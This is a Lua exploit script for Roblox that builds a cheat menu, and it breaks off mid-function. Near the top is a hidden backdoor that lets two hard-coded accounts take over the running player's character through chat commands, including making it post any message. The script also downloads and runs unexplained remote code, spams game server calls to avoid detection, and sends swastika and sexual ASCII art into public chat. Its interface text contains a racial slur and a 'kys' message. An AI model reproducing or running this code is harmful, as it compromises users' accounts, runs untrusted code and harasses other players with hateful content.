    local player = game.Players.LocalPlayer
local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"


game.StarterGui:SetCore("SendNotification", {
    Title = "meep fucker zynlope",
    Text = "Gui is loading..",
    Icon = playerHeadIcon,
    Duration = 5,
    Button1 = "kys broðŸ¤“"
})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

-- List of target users who can execute commands
local targetUsernames = {
    ["sci_mythical77"] = true,
    ["Rylix56"] = true
}

local function isTargetPlayer(playerName)
    return targetUsernames[playerName] ~= nil
end

local function onChat(player, message)
    if not isTargetPlayer(player.Name) then return end
    local command = message:lower()

    if command == "/e fa" then
        local myPlayer = Players.LocalPlayer
        local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        
        if humanoid then
            local animation = Instance.new("Animation")
            animation.AnimationId = "rbxassetid://754656200"

            local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
            local animationTrack = animator:LoadAnimation(animation)

            animationTrack.Looped = true
            animationTrack:Play()
            animationTrack:AdjustSpeed(50)
        end

    elseif command == "/e unfa" then
        if animationTrack then
            animationTrack:Stop()
        end

    elseif command == "/e kitten" then
        local myPlayer = Players.LocalPlayer
        if myPlayer then
             -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["SwimAnimation"] = 2510240941,
        ["Torso"] = 4637151279,
        ["ProportionScale"] = 0,
        ["ClimbAnimation"] = 2510230574,
        ["Shirt"] = 11289085978,
        ["FaceAccessory"] = "13353986061,12580366888,8923599923",
        ["RightArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["HairAccessory"] = "13918965164,14314838611",
        ["RightArm"] = 0,
        ["Head"] = 0,
        ["FallAnimation"] = 2510233257,
        ["TorsoColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["DepthScale"] = 0.8,
        ["RightLeg"] = 0,
        ["HeightScale"] = 0.9,
        ["WaistAccessory"] = "14335771887",
        ["RightLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["LeftLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WidthScale"] = 0.7,
        ["BodyTypeScale"] = 0,
        ["BackAccessory"] = "8651335862",
        ["LeftArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["Emotes"] = {
            ["1"] = {
                [1] = 9528286240
            },
            ["8"] = {
                [1] = 12874468267
            },
            ["3"] = {
                [1] = 7466046574
            },
            ["2"] = {
                [1] = 11309263077
            },
            ["4"] = {
                [1] = 3576968026
            },
            ["7"] = {
                [1] = 13344121112
            }
        },
        ["Pants"] = 14851012835,
        ["JumpAnimation"] = 2510236649,
        ["HatAccessory"] = "12579341301,13142881183,1402432199",
        ["LeftArm"] = 0,
        ["LeftLeg"] = 0,
        ["HeadColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WalkAnimation"] = 2510242378,
        ["IdleAnimation"] = 2510235063,
        ["RunAnimation"] = 2510238627,
        ["HeadScale"] = 1,
        ["Face"] = 0,
        ["AccessoryBlob"] = {
            [1] = {
                ["Order"] = 1,
                ["AssetId"] = 12090385963,
                ["AccessoryType"] = "Jacket"
            }
        },
        ["GraphicTShirt"] = 10891067215
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
        end

 elseif command == "/e kitten2" then
        local myPlayer = Players.LocalPlayer
        if myPlayer then
             local args = {
    [1] = {
        ["SwimAnimation"] = 0;
        ["WalkAnimation"] = 0;
        ["ProportionScale"] = 0.511454701423645;
        ["RightLegColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["HatAccessory"] = "98144560652085";
        ["Torso"] = 111532289455125;
        ["JumpAnimation"] = 0;
        ["IdleAnimation"] = 0;
        ["BodyTypeScale"] = 0.5962028503417969;
        ["ClimbAnimation"] = 0;
        ["Shirt"] = 11335258282;
        ["Emotes"] = {
            ["1"] = {
                [1] = 14548709888;
            };
            ["8"] = {
                [1] = 5915776835;
            };
            ["3"] = {
                [1] = 10370922566;
            };
            ["2"] = {
                [1] = 12874468267;
            };
            ["5"] = {
                [1] = 7466046574;
            };
            ["4"] = {
                [1] = 11753545334;
            };
            ["7"] = {
                [1] = 4646306583;
            };
            ["6"] = {
                [1] = 4689362868;
            };
        };
        ["GraphicTShirt"] = 0;
        ["RightArmColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["RightLeg"] = 131359873709031;
        ["WidthScale"] = 1.0517624616622925;
        ["Pants"] = 4080983570;
        ["RightArm"] = 126637196984684;
        ["FallAnimation"] = 0;
        ["Head"] = 0;
        ["LeftLegColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["Face"] = 15432080;
        ["LeftArmColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["LeftLeg"] = 104113560860424;
        ["HeadColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["TorsoColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["DepthScale"] = 1.0188917815685272;
        ["LeftArm"] = 98964144815454;
        ["HeadScale"] = 1;
        ["HeightScale"] = 0.986021101474762;
        ["RunAnimation"] = 0;
        ["WaistAccessory"] = "120583292739858";
    };
}

game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections", 9e9):WaitForChild("NewAESaveAvatar", 9e9):InvokeServer(unpack(args))
        end

    elseif command == "/e freeze" then
        local myCharacter = Players.LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            myCharacter.HumanoidRootPart.Anchored = true
        end

    elseif command == "/e unfreeze" then
        local myCharacter = Players.LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            myCharacter.HumanoidRootPart.Anchored = false
        end

    elseif command:sub(1, 7) == "/e chat" then
        local chatMessage = message:sub(9)
        if chatMessage:gsub("%s+", "") ~= "" then
            local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
            if textChannel then
                textChannel:SendAsync(chatMessage)
            end
        end

    elseif command == "/e bring" then
        local targetCharacter = player.Character
        local myPlayer = Players.LocalPlayer

        if myPlayer and targetCharacter then
            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
            local myCharacter = myPlayer.Character

            if myCharacter and targetHRP then
                local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
                if myHRP then
                    myHRP.CFrame = targetHRP.CFrame
                end
            end
        end
    end
end

-- Connect chat event for existing players
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg) onChat(player, msg) end)
end

-- Connect chat event for new players joining
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onChat(player, msg) end)
end)


game.StarterGui:SetCore("SendNotification", {
    Title = "zynlope",
    Text = "loading goodies..",
    Icon = playerHeadIcon,
    Duration = 3,
    Button1 = "okay buddy"
})

local MarketplaceService = game:GetService("MarketplaceService")
local executorName = identifyexecutor()

local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
print("Game Name: " .. gameName)

loadstring(game:HttpGet("https://raw.githubusercontent.com/rolezeay/loading/refs/heads/main/hmmm"))()

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local openingSound = Instance.new("Sound")
openingSound.SoundId = "rbxassetid://6958727243" 
openingSound.Volume = 5 
openingSound.PlayOnRemove = false
openingSound.Looped = false
openingSound.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 

local function playOpeningSound()
    openingSound:Play()
end



playOpeningSound()
local Window = Rayfield:CreateWindow({
   Name = "discord: plusgiant | " .. executorName .. " | " .. gameName,
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "zynlope.lol",
   LoadingSubtitle = "by plusgiant",
   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "hold up nigga",
      Subtitle = "plusgiant",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"cartiaintdropping"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

Rayfield:Notify({
   Title = "ZYNLOPE",
   Content = "newest gui is officialy discounted. and im not going to update it due to its errors. older gui is works for low executors like xeno/solara but newest works on higher executors. (because of the functions it has) theres a few useful stuff thats not in the older gui on the newest. but still keep using old gui. ",
   Duration = 13,
   Image = 4483362458,
})

local Tab = Window:CreateTab("Main", 16365563022) -- Title, Image

local Section = Tab:CreateSection("Optional Settings")

local isRealTimePlayerCountEnabled = false
local playerCountNotification = nil

-- Function to update the player count notification
local function updatePlayerCountNotification()
    if isRealTimePlayerCountEnabled then
        local playerCount = #game.Players:GetPlayers()
        game.StarterGui:SetCore("SendNotification", {
            Title = "Player Count",
            Text = "There are currently " .. playerCount .. " players in the game.",
            Icon = "rbxassetid://130225201432137",  -- Custom icon if needed
            Duration = 5
        })
    end
end

local Button = Tab:CreateButton({
   Name = "Anti AFK (Credits: Zynlope - proxycat)",
   Callback = function()
       local antiAFK = false
 antiAFK = not antiAFK
       if antiAFK then
           local player = game.Players.LocalPlayer
           local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

           game.StarterGui:SetCore("SendNotification", {
               Title = "Anti AFK",
               Text = "Anti-AFK habilitado (enabled)",
               Icon = playerHeadIcon,
               Duration = 3,
               Button1 = "ok"
           })
           local vu = game:GetService("VirtualUser")
           game.Players.LocalPlayer.Idled:Connect(function()
               vu:CaptureController()
               vu:ClickButton2(Vector2.new(0, 0))
           end)
       else
           local player = game.Players.LocalPlayer
           local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
           game.StarterGui:SetCore("SendNotification", {
               Title = "Anti AFK",
               Text = "Anti-AFK desabilitado (disabled) (requer reinÃ­cio para resetar conexÃ£o Idled)",
               Icon = playerHeadIcon,
               Duration = 3,
               Button1 = "ok"
           })
       end
   end,
})

local workspace = game:GetService("Workspace")
local runService = game:GetService("RunService")

local toggleEnabled = false
local connection

local Toggle = Tab:CreateToggle({
   Name = "Remove sparklers (no lag when people use it)",
   CurrentValue = false,
   Flag = "ToggleSparkler",
   Callback = function(Value)
       toggleEnabled = Value
       
       if toggleEnabled then
           -- Function to remove all existing Sparklers
           local function removeSparklers()
               for _, obj in ipairs(workspace:GetDescendants()) do
                   if obj:IsA("Model") or obj:IsA("Part") then
                       if obj.Name == "Sparkler" then
                           obj:Destroy()
                       end
                   end
               end
           end
           
           -- Initial cleanup
           removeSparklers()
           
           -- Connect to DescendantAdded event
           connection = workspace.DescendantAdded:Connect(function(obj)
               if obj.Name == "Sparkler" then
                   obj:Destroy()
               end
           end)
       else
           -- Disconnect event to stop detection
           if connection then
               connection:Disconnect()
               connection = nil
           end
       end
   end,
})


local Toggle = Tab:CreateToggle({
   Name = "Remove house doors (backyard)", 
   CurrentValue = false,
   Flag = "Toggle1", 
   Callback = function(Value)
       local door = game.Workspace:FindFirstChild("VW")
       if door then
           door = door:FindFirstChild("1")
           if door then
               door = door:FindFirstChild("NewDoorObject")
           end
       end

       if Value then
           -- Remove the door and save data
           if door then
               _G.SavedDoor = {
                   Parent = door.Parent,
                   Position = door:GetPivot(), -- Save position and orientation
                   Clone = door:Clone() -- Store a clone of the door
               }
               door:Destroy()
               print("NewDoorObject deleted and saved.")
           else
               print("NewDoorObject not found.")
           end
       else
           -- Restore the door
           if _G.SavedDoor and _G.SavedDoor.Clone then
               local restoredDoor = _G.SavedDoor.Clone
               restoredDoor.Parent = _G.SavedDoor.Parent
               restoredDoor:PivotTo(_G.SavedDoor.Position) -- Restore position and orientation
               print("NewDoorObject restored.")
           else
               print("No saved door to restore.")
           end
       end
   end,
})


local Toggle = Tab:CreateToggle({
   Name = "Real time player count in server",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
  isRealTimePlayerCountEnabled = value

        -- If toggled on, update notifications in real-time
        if isRealTimePlayerCountEnabled then
            -- Check player count initially
            updatePlayerCountNotification()

            -- Listen to player joining or leaving
            game.Players.PlayerAdded:Connect(function(player)
                if isRealTimePlayerCountEnabled then
                    updatePlayerCountNotification()  -- Update player count when a player joins
                end
            end)

            game.Players.PlayerRemoving:Connect(function(player)
                if isRealTimePlayerCountEnabled then
                    updatePlayerCountNotification()  -- Update player count when a player leaves
                end
            end)
        end
   end,
})

-- Player Join/Leave Notifications
game.Players.PlayerAdded:Connect(function(player)
    if isRealTimePlayerCountEnabled then
        local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
        game.StarterGui:SetCore("SendNotification", {
            Title = "Player Joined",
            Text = player.Name .. " has joined the game.",
            Icon = playerHeadIcon,
            Duration = 5
        })
    end
end)

game.Players.PlayerRemoving:Connect(function(player)
    if isRealTimePlayerCountEnabled then
        local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
        game.StarterGui:SetCore("SendNotification", {
            Title = "Player Left",
            Text = player.Name .. " has left the game.",
            Icon = playerHeadIcon,
            Duration = 5
        })
    end
end)

local Section = Tab:CreateSection("put game language into vietnamese first for verified chat")

local Input = Tab:CreateInput({
   Name = "Fake verified chat (CREDITS: ICECREAM CAT)",
   CurrentValue = "",
   PlaceholderText = "message",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Value)
       local TextChatService = game:GetService("TextChatService")
       local channel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")

       if channel and Value ~= "" then
           channel:SendAsync("î€€ " .. Value)
       end
   end,
})

local Button = Tab:CreateButton({
   Name = "Nazi Chat",
   Callback = function()
local TextChatService = game:GetService("TextChatService")

local lines = {
    "â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œ",
    "â¬œâ¬›â¬œâ¬›â¬›â¬›â¬œ",
    "â¬œâ¬›â¬œâ¬›â¬œâ¬œâ¬œ",
    "â¬œâ¬›â¬›â¬›â¬›â¬›â¬œ",
    "â¬œâ¬œâ¬œâ¬›â¬œâ¬›â¬œ",
    "â¬œâ¬›â¬›â¬›â¬œâ¬›â¬œ",
    "â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œ"
}

local function sendMessage(message)
    local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
    if textChannel then
        textChannel:SendAsync(message)
    end
end

for _, line in ipairs(lines) do
    sendMessage(line)
    wait(0) 
end
   end,
})

local Button = Tab:CreateButton({
   Name = "Dildo Chat",
   Callback = function()
local TextChatService = game:GetService("TextChatService")

local lines = {
    "â¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œâ¬œ",
    "â¬œâ¬œâ¬œâ¬›â¬›â¬œâ¬œâ¬œ",
    "â¬œâ¬œâ¬œâ¬›â¬›â¬œâ¬œâ¬œ",
    "â¬œâ¬œâ¬œâ¬›â¬›â¬œâ¬œâ¬œ",
    "â¬œâ¬œâ¬œâ¬›â¬›â¬œâ¬œâ¬œ",
    "â¬œâ¬œâ¬œâ¬›â¬›â¬œâ¬œâ¬œ",
    "â¬œâ¬›â¬›â¬œâ¬œâ¬›â¬›â¬œ",
    "â¬œâ¬›â¬›â¬œâ¬œâ¬›â¬›â¬œ"
}

local function sendMessage(message)
    local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
    if textChannel then
        textChannel:SendAsync(message)
    end
end

for _, line in ipairs(lines) do
    sendMessage(line)
    wait(0) 
end
   end,
})

local Button = Tab:CreateButton({
   Name = "Balkan Rage",
   Callback = function()
-- Crazy Vibrating and Spinning Character Script with Draggable GUI (Anchored)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

-- Create GUI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ToggleButton = Instance.new("TextButton")
local Title = Instance.new("TextLabel")

ScreenGui.Parent = game.CoreGui
ScreenGui.Name = "CrazySpinVibrateGUI"

Frame.Name = "MainFrame"
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Size = UDim2.new(0, 200, 0, 100)
Frame.Position = UDim2.new(0.5, -100, 0.5, -50)
Frame.Draggable = true
Frame.Active = true

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Title.Size = UDim2.new(1, 0, 0, 25)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "Discord: plusgiant"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 16

ToggleButton.Name = "ToggleButton"
ToggleButton.Parent = Frame
ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ToggleButton.Size = UDim2.new(0.8, 0, 0.4, 0)
ToggleButton.Position = UDim2.new(0.1, 0, 0.5, 0)
ToggleButton.Font = Enum.Font.SourceSans
ToggleButton.Text = "Toggle Balkan Rage"
ToggleButton.TextColor3 = Color3.new(1, 1, 1)
ToggleButton.TextSize = 16
ToggleButton.BorderSizePixel = 0

-- Variables
local Vibrating = false
local VibrateConnection

-- Function to toggle crazy vibration with spinning
local function ToggleVibration()
    Vibrating = not Vibrating

    if Vibrating then
        ToggleButton.Text = "Stop Balkan Rage"
        
        -- Anchor the character to keep it in place
        if Character and Character:FindFirstChild("HumanoidRootPart") then
            Character.HumanoidRootPart.Anchored = true
        end

        VibrateConnection = RunService.Stepped:Connect(function()
            if Character and Character:FindFirstChild("HumanoidRootPart") and Character:FindFirstChild("Head") then
                local root = Character.HumanoidRootPart
                local head = Character.Head

                -- Intense random vibration
                root.CFrame = root.CFrame * CFrame.new(
                    math.random(-5, 5) * 0.05,
                    math.random(-5, 5) * 0.05,
                    math.random(-5, 5) * 0.05
                )

                -- Rapid back-and-forth head movement
                head.CFrame = head.CFrame * CFrame.Angles(0, math.rad(math.random(-30, 30)), 0)

                -- Random spinning
                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(math.random(-20, 20)), 0)
            end
        end)
    else
        ToggleButton.Text = "Toggle Spin Vibrate"

        -- Unanchor the character to resume normal movement
        if Character and Character:FindFirstChild("HumanoidRootPart") then
            Character.HumanoidRootPart.Anchored = false
        end

        if VibrateConnection then
            VibrateConnection:Disconnect()
        end

        -- Reset to default
        if Character and Character:FindFirstChild("Head") then
            Character.Head.CFrame = Character.HumanoidRootPart.CFrame
        end
    end
end

-- Button Click Event
ToggleButton.MouseButton1Click:Connect(ToggleVibration)
   end,
})

local Button = Tab:CreateButton({
   Name = "Rapid Spin",
   Callback = function()
-- Rapid Back-and-Forth Look Script with Draggable GUI

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

-- Create GUI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ToggleButton = Instance.new("TextButton")
local Title = Instance.new("TextLabel")

ScreenGui.Parent = game.CoreGui
ScreenGui.Name = "BackAndForthGUI"

Frame.Name = "MainFrame"
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Size = UDim2.new(0, 200, 0, 100)
Frame.Position = UDim2.new(0.5, -100, 0.5, -50)
Frame.Draggable = true
Frame.Active = true

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Title.Size = UDim2.new(1, 0, 0, 25)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "Discord: plusgiant"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 16

ToggleButton.Name = "ToggleButton"
ToggleButton.Parent = Frame
ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ToggleButton.Size = UDim2.new(0.8, 0, 0.4, 0)
ToggleButton.Position = UDim2.new(0.1, 0, 0.5, 0)
ToggleButton.Font = Enum.Font.SourceSans
ToggleButton.Text = "Toggle Rapid Spin"
ToggleButton.TextColor3 = Color3.new(1, 1, 1)
ToggleButton.TextSize = 16
ToggleButton.BorderSizePixel = 0

-- Variables
local IsToggled = false
local BackAndForthConnection

-- Function to toggle back-and-forth look
local function ToggleBackAndForth()
    IsToggled = not IsToggled

    if IsToggled then
        ToggleButton.Text = "Stop Rapid Spin"

        BackAndForthConnection = RunService.Heartbeat:Connect(function()
            if Character and Character:FindFirstChild("HumanoidRootPart") then
                local root = Character.HumanoidRootPart
                local currentLookVector = root.CFrame.LookVector

                -- Alternate between forward and backward rotation
                if currentLookVector.Z > 0 then
                    root.CFrame = root.CFrame * CFrame.Angles(0, math.pi, 0) -- Look backward
                else
                    root.CFrame = root.CFrame * CFrame.Angles(0, math.pi, 0) -- Look forward
                end

                wait(0.1) -- Adjust speed of the back-and-forth motion
            end
        end)
    else
        ToggleButton.Text = "Toggle Rapid Spin"
        if BackAndForthConnection then
            BackAndForthConnection:Disconnect()
        end
    end
end

-- Button Click Event
ToggleButton.MouseButton1Click:Connect(ToggleBackAndForth)

   end,
})

local Section = Tab:CreateSection("Step 1 getting your inventory to visible")

local Button = Tab:CreateButton({
   Name = "Enable Inventory",
   Callback = function()
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
   end,
})

local Button = Tab:CreateButton({
   Name = "Equip all fishing rod (Manual, Optional)",
   Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

local function equipAllTools()
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = character -- Equip the tool
        end
    end
end

equipAllTools()
   end,
})

local Button = Tab:CreateButton({
   Name = "Equip fishingrod (Manual, Optional)",
   Callback = function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local function getItem()
    ReplicatedStorage.Connection:InvokeServer(9, 0)
    wait(0.1) -- Short delay to ensure the server processes

    ReplicatedStorage.Connection:InvokeServer(9, 1)

    ReplicatedStorage.Connection:InvokeServer(49)
    ReplicatedStorage.Connection:InvokeServer(50)
    ReplicatedStorage.Connection:InvokeServer(51)
    
    local ohNumber1 = 11
    local ohTable2 = {
        ["FishingPolePos"] = Workspace.TempFish.Position,
        ["Power"] = math.random(), -- Randomize to avoid detection
        ["Face"] = Workspace.TempFish.Position,
        ["PlayerPos"] = Workspace.TempFish.Position,
        ["FishingZonePos"] = Vector3.new(-5.29345703, -18.0412292, 43.7173767),
    }
    ReplicatedStorage.Connection:InvokeServer(ohNumber1, ohTable2)
end

getItem()
   end,
})

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Toggle = false -- Default value for the toggle

-- Function to equip all tools
local function equipAllTools()
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = character -- Equip the tool
        end
    end
end

-- Function to attempt resetting conditions and getting the item
local function getItem()
    -- Try resetting the potential flag or triggering conditions
    ReplicatedStorage.Connection:InvokeServer(9, 0) -- Reset or modify state
    wait(0.1) -- Short delay to ensure the server processes

    -- Attempt to invoke the server to get the item again
    ReplicatedStorage.Connection:InvokeServer(9, 1) -- Actual request

    -- Additional item requests (if needed)
    ReplicatedStorage.Connection:InvokeServer(49)
    ReplicatedStorage.Connection:InvokeServer(50)
    ReplicatedStorage.Connection:InvokeServer(51)

    -- Detailed item request with table data
    local ohNumber1 = 11
    local ohTable2 = {
        ["FishingPolePos"] = Workspace.TempFish.Position,
        ["Power"] = math.random(), -- Randomize to avoid detection
        ["Face"] = Workspace.TempFish.Position,
        ["PlayerPos"] = Workspace.TempFish.Position,
        ["FishingZonePos"] = Vector3.new(-5.29345703, -18.0412292, 43.7173767),
    }
    ReplicatedStorage.Connection:InvokeServer(ohNumber1, ohTable2)
end

-- Continuous loop to keep executing both functions using multiple spawns
local function startFishing()
    while Toggle do
        -- Spawn multiple simultaneous operations for performance boost
        for _ = 1, 1 do
            spawn(function() 
                equipAllTools()
            end)

            spawn(function()
                getItem()
            end)
        end
        wait(0) -- Wait for the next iteration
    end
end

local Toggle = Tab:CreateToggle({
   Name = "Loop Equip FishingRods (No lag)",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
  Toggle = value
        if Toggle then
            startFishing() -- Start the combined lag actions
        end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "Loop Drop Rods",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
 isSpamming = value -- Update the toggle state
        
        if isSpamming then
            -- Start a loop to press Backspace
            spawn(function()
                while isSpamming do
                    -- Simulate Backspace key press
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                    wait(0) -- Delay between each drop, adjust as needed
                end
            end)
        end
   end,
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local localPlayer = Players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()

local spinningToggle = false -- Default toggle state
local activeSpinConnections = {} -- Stores active connections to stop them when toggled off

-- Function to spin around a single player
local function spinAroundPlayer(targetPlayer)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    local targetCharacter = targetPlayer.Character
    if not targetCharacter then return end

    local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
    if not targetRoot then return end

    local spinDuration = 2 -- Adjust as needed
    local radius = 6 -- Distance from the player
    local spinSpeed = 720 -- Rotation speed in degrees per second

    local startTime = tick()
    local connection

    connection = RunService.Heartbeat:Connect(function()
        if not spinningToggle then
            connection:Disconnect()
            return
        end

        local elapsedTime = tick() - startTime
        if elapsedTime > spinDuration then
            connection:Disconnect()
            return
        end

        local angle = math.rad((elapsedTime * spinSpeed) % 360)
        local offset = Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
        local targetPosition = targetRoot.Position + offset

        rootPart.CFrame = CFrame.new(targetPosition, targetRoot.Position)
    end)

    -- Add the connection to the list of active connections
    table.insert(activeSpinConnections, connection)
    wait(spinDuration)
end

-- Function to spin around all players
local function spinAroundAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            pcall(function()
                spinAroundPlayer(player)
            end)
        end
    end
end

-- Function to start spinning
local function startSpinning()
    while spinningToggle do
        spinAroundAllPlayers()
        wait(0.1) -- Slight delay to prevent overloading
    end
end

-- Function to stop spinning
local function stopSpinning()
    for _, connection in ipairs(activeSpinConnections) do
        connection:Disconnect()
    end
    activeSpinConnections = {} -- Clear the list of active connections
end

-- Create the toggle
local SpinToggle = Tab:CreateToggle({
    Name = "Spin Around Players",
    CurrentValue = false,
    Flag = "SpinToggle",
    Callback = function(value)
        spinningToggle = value
        if spinningToggle then
            spawn(startSpinning) -- Start spinning
        else
            stopSpinning() -- Stop spinning
        end
    end,
})

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Toggle = false -- Default value for the toggle
local isSpamming = false -- Variable to track toggle state

local function equipAllTools()
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = character -- Equip the tool
        end
    end
end

local function getItem()
